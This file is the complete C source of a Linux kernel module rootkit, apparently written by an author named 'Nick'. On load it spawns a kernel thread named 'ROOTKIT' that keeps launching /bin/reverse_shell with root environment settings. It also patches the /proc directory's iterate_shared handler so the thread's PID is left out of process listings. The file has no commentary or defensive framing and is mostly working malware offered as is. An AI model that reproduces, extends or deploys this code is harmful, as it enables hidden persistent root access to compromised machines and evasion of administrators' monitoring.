#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/delay.h>
#include <linux/kthread.h>
#include <linux/namei.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/sched/signal.h>

#define PROC_LEN 128
#define PROCS_DIR "/proc"

static char proc_to_hide[PROC_LEN];
static struct file_operations new_proc_fops;
static struct file_operations *orig_proc_fops;
static struct inode *target_inode;
static struct dir_context *orig_ctx;

static void get_current_proc_id(void)
{
	memset(proc_to_hide, '\0', PROC_LEN);

	struct task_struct *task_list;
	for_each_process(task_list) {
		if(strcmp(task_list->comm, "ROOTKIT") == 0) {
			sprintf(proc_to_hide, "%d", task_list->pid);
			return;
		}
	}
}

static int mod_filldir_t(struct dir_context *ctx, const char *proc_name, int len, loff_t off, u64 ino, unsigned int d_type)
{
    if (strncmp(proc_name, proc_to_hide, strlen(proc_to_hide)) == 0)
        return 0;

    return orig_ctx->actor(orig_ctx, proc_name, len, off, ino, d_type);
}

static struct dir_context rk_ctx = {
    .actor = mod_filldir_t,
};

static int mod_iterate_shared(struct file *file, struct dir_context *ctx)
{
    rk_ctx.pos = ctx->pos;
    orig_ctx = ctx;
    int ret_status = orig_proc_fops->iterate_shared(file, &rk_ctx);
    ctx->pos = rk_ctx.pos;

    return ret_status;
}

static int modify_procs(void)
{
	struct path path;

	int status = kern_path(PROCS_DIR, LOOKUP_FOLLOW, &path);
	if(status)
		return -EFAULT;

	target_inode = path.dentry->d_inode;
	new_proc_fops = *target_inode->i_fop;
	orig_proc_fops = target_inode->i_fop;
	new_proc_fops.iterate_shared = mod_iterate_shared;
	target_inode->i_fop = &new_proc_fops;

	return 0;
}

static int restore_procs(void)
{
	struct path path;

	int status = kern_path(PROCS_DIR, LOOKUP_FOLLOW, &path);
	if(status)
		return -EFAULT;

	target_inode = path.dentry->d_inode;
	target_inode->i_fop = orig_proc_fops;

	return 0;
}

static struct task_struct *rk_thread;

static int thread_func(void *arg)
{
	char *argv[] = { "/bin/reverse_shell", "reverse_shell", NULL };

	char *envp[] = {
		"SHELL=/bin/bash",
		"HOME=/root",
		"USER=root",
		"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin",
		"DISPLAY=:0",
		"PWD=/root",
		NULL
	};

	do {
		call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
	} while(!kthread_should_stop());

	return 0;
}

static void rk_start(void)
{
	rk_thread = kthread_create(thread_func, NULL, "ROOTKIT");
	kthread_bind(rk_thread, 0);
	wake_up_process(rk_thread);
}

static int __init inject_mod(void)
{
	printk(KERN_INFO "LKM succefully loaded!\n");

	rk_start();
	msleep(5000);
	get_current_proc_id();
	modify_procs();

	return 0;
}

static void __exit eject_mod(void)
{
	if(rk_thread)
		kthread_stop(rk_thread);
	restore_procs();
	printk(KERN_INFO "LKM succefully unloaded!\n");
}

module_init(inject_mod);
module_exit(eject_mod);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Nick");
